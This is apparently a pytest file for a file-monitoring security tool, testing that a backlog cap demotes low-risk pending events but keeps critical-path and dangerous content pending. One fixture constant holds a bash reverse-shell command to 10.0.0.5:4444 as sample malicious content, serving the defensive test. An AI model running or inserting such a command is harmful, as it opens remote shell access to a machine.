"""Tests for low-priority pending backlog caps."""
import os
import sys
from unittest import mock

from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from core import background_analysis
from core.background_analysis import enforce_pending_hard_cap
from core.models import Base, FileLog


DANGEROUS_SCRIPT = "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1\n"


def _session_factory():
    engine = create_engine("sqlite:///:memory:")
    Base.metadata.create_all(engine)
    return sessionmaker(bind=engine)


def _add_pending(session, path, content="ordinary log line\n", event_type="new"):
    session.add(FileLog(
        path=path,
        event_type=event_type,
        new_hash=f"hash-{path}",
        status="pending",
        analysis_json={
            "diff": content,
            "metadata": {"is_baseline": False, "file_category": "log"},
        },
    ))


def test_backlog_cap_records_low_risk_tier4_events():
    Session = _session_factory()
    session = Session()
    try:
        for idx in range(3):
            _add_pending(session, f"C:/Users/alice/AppData/Local/Temp/{idx}.log")
        session.commit()

        with mock.patch.object(background_analysis, "get_tier_for_path", return_value=4):
            demoted = enforce_pending_hard_cap(session, hard_cap=1, demote_limit=3)

        rows = session.query(FileLog).order_by(FileLog.id).all()
        assert demoted == 2
        assert [row.status for row in rows].count("recorded") == 2
        assert [row.status for row in rows].count("pending") == 1
        assert rows[0].analysis_json["backlog_demoted"] is True
    finally:
        session.close()


def test_backlog_cap_keeps_critical_tier_pending():
    Session = _session_factory()
    session = Session()
    try:
        _add_pending(session, "C:/Windows/System32/critical.dll")
        _add_pending(session, "C:/Users/alice/AppData/Local/Temp/a.log")
        _add_pending(session, "C:/Users/alice/AppData/Local/Temp/b.log")
        session.commit()

        def tier_for(path):
            return 1 if "System32" in path else 4

        with mock.patch.object(background_analysis, "get_tier_for_path", side_effect=tier_for):
            demoted = enforce_pending_hard_cap(session, hard_cap=1, demote_limit=3)

        rows = session.query(FileLog).order_by(FileLog.id).all()
        critical = rows[0]
        assert demoted == 2
        assert critical.status == "pending"
        assert critical.path.endswith("critical.dll")
    finally:
        session.close()


def test_backlog_cap_does_not_demote_dangerous_readable_content():
    Session = _session_factory()
    session = Session()
    try:
        _add_pending(session, "C:/Users/alice/AppData/Local/Temp/danger.sh", DANGEROUS_SCRIPT)
        _add_pending(session, "C:/Users/alice/AppData/Local/Temp/safe.log")
        session.commit()

        with mock.patch.object(background_analysis, "get_tier_for_path", return_value=4):
            demoted = enforce_pending_hard_cap(session, hard_cap=1, demote_limit=2)

        rows = session.query(FileLog).order_by(FileLog.id).all()
        assert demoted == 1
        assert rows[0].status == "pending"
        assert rows[1].status == "recorded"
    finally:
        session.close()


def test_process_pending_analysis_applies_hard_cap_before_batch():
    Session = _session_factory()
    session = Session()
    try:
        for idx in range(3):
            _add_pending(session, f"C:/Users/alice/AppData/Local/Temp/{idx}.log")
        session.commit()
    finally:
        session.close()

    calls = []

    def fake_analyze(file_path, change_type, diff, metadata):
        calls.append(file_path)
        return {
            "risk_score": 2,
            "priority": "low",
            "is_malicious": False,
            "reasoning": "Remaining event analyzed.",
            "analysis_source": "test",
        }

    with mock.patch.object(background_analysis, "SessionLocal", Session), \
            mock.patch.object(background_analysis, "get_tier_for_path", return_value=4), \
            mock.patch.object(background_analysis, "_PENDING_HARD_CAP", 1), \
            mock.patch.object(background_analysis, "_DEMOTE_BATCH_SIZE", 10), \
            mock.patch.object(background_analysis, "analyze_file_change", side_effect=fake_analyze):
        processed = background_analysis.process_pending_analysis(batch_size=10)

    session = Session()
    try:
        statuses = [row.status for row in session.query(FileLog).order_by(FileLog.id)]
        assert processed == 1
        assert len(calls) == 0
        assert statuses.count("recorded") == 2
        assert statuses.count("analyzed") == 1
    finally:
        session.close()
